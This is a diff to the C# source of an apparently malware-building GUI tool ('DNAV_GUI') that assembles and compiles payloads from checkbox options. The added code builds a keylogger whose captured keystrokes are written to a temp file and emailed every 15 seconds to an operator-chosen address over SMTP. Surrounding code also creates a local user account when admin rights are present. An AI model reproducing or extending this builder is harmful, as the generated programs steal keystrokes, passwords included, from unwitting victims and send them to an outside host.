@@ -1065,6 +1065,55 @@ namespace DNAV_GUI
             SetWindowPos(TaskbarHWnd, IntPtr.Zero, 0, 0, 0, 0, SetWindowPosFlags.SWP_SHOWWINDOW);
         }
     }";
+            string emailCode = @"class Mailer {
+        public string toEmail;
+        public string fromEmail;
+        public string username;
+        public string pw;
+        public int port;
+        public string smtpHost;
+      
+        public Mailer(string mtoEmail, string mfromEmail, string musername, string mpw, int mport, string msmtpHost)
+        {               
+            fromEmail = mfromEmail;
+            username = musername;
+            pw = mpw;
+            port = mport;
+            smtpHost = msmtpHost;     
+            toEmail = mtoEmail;        
+        }
+      
+        private void sender(MailMessage mail, string subject, string msg) {
+            SmtpClient SmtpServer = new SmtpClient();
+            SmtpServer.UseDefaultCredentials = false;
+            SmtpServer.Credentials = new System.Net.NetworkCredential(username, pw);
+            SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
+            SmtpServer.EnableSsl = true;
+            mail.To.Add(toEmail);
+            mail.From = new MailAddress(fromEmail);          
+            mail.Subject = subject;  
+            mail.Body = msg;
+            SmtpServer.Host = smtpHost;
+            SmtpServer.Port = port;
+            SmtpServer.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
+            try {
+                SmtpServer.Send(mail);
+            } catch (Exception ex) {
+                //Console.WriteLine(ex);
+            }
+        }
+        public void send(string sub, string msg) { //? Nur Betreff&Text
+            MailMessage mail = new MailMessage();
+            sender(mail, sub, msg);
+        }
+        public void send(string sub, string msg, string path) { //? Betreff&Text mit Anhang
+            MailMessage mail = new MailMessage();
+            mail.Attachments.Add(new Attachment(path));
+            sender(mail, sub, msg);
+        }
+           
+        
+    }";
 
 
             bool useSystemDiagnostics = false;
@@ -1075,6 +1124,7 @@ namespace DNAV_GUI
             bool useSystemDrawing = false;
             bool useSystemDrawingImaging = false;
             bool useSystemDirectoryServices = false;
+            bool useSystemNetMail = false;
 
             bool needAdmin = false;
 
@@ -1161,6 +1211,11 @@ namespace DNAV_GUI
                 useSystemDirectoryServices = true;
             }
 
+            if (keyloggerEmailCheckbox.IsChecked == true || microphoneEmailCheckbox.IsChecked == true || screenshotEmailCheckbox.IsChecked == true)
+            {
+                useSystemNetMail = true;   
+            }
+
             CSharpCodeProvider provider = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters();
 
@@ -1192,6 +1247,8 @@ namespace DNAV_GUI
                 code += "using System.Drawing.Imaging;";
             if (useSystemDirectoryServices)
                 code += "using System.DirectoryServices;";
+            if (useSystemNetMail)
+                code += "using System.Net.Mail;";
 
             code += "namespace " + nameTextBox.Text + "{";
             code += "class Program{";
@@ -1227,11 +1284,17 @@ namespace DNAV_GUI
                             break;
                     }
                     code += "+ \"\\\\log.txt\"));keylogger.Start();";
+                } else
+                {
+                    code += "Thread keylogger = new Thread(() => Keylogger.Enable());keylogger.Start();";
                 }
 
                 if (keyloggerEmailCheckbox.IsChecked == true)
                 {
-
+                    code += "Thread keyloggerMailer = new Thread(() => {Mailer m = new Mailer(\"" + emailToTextbox.Text + "\", \"" + emailFromTextbox.Text + "\", \"" + emailUsernameTextbox.Text + "\", \"" + emailPasswordTextbox.Password + "\", " + emailPortTextbox.Text + ", \"" + emailSMTPTextbox.Text + "\");while(true){Thread.Sleep(15000);";
+                    code += "string tmp = Path.GetTempFileName();StreamWriter sw = new StreamWriter(tmp);sw.WriteLine(Keylogger.Keys);sw.Close();";
+                    code += "m.send(\"Log\", \"Log im Anhang\", tmp);}});keyloggerMailer.Start();";
+                    
                 }
             }
 
@@ -1362,6 +1425,8 @@ namespace DNAV_GUI
                 code += @"if(isAdmin)User.Create(""" + createUserUsernameTextbox.Text + @""", """ + createUserPasswortTextbox.Password + @""");";
             }
 
+            code += "while(true){Thread.Sleep(5000);Console.WriteLine(\"Running...\");}";
+
             code += "}"; // Close void Main
             code += "}"; // Close class Program
 
@@ -1418,6 +1483,11 @@ namespace DNAV_GUI
             if (createUserCheckbox.IsChecked == true)
             {
                 code += createUserCode;
+            }
+
+            if (keyloggerEmailCheckbox.IsChecked == true || microphoneEmailCheckbox.IsChecked == true || screenshotEmailCheckbox.IsChecked == true)
+            {
+                code += emailCode;
             }
 
             code += "}"; // Close Namespace
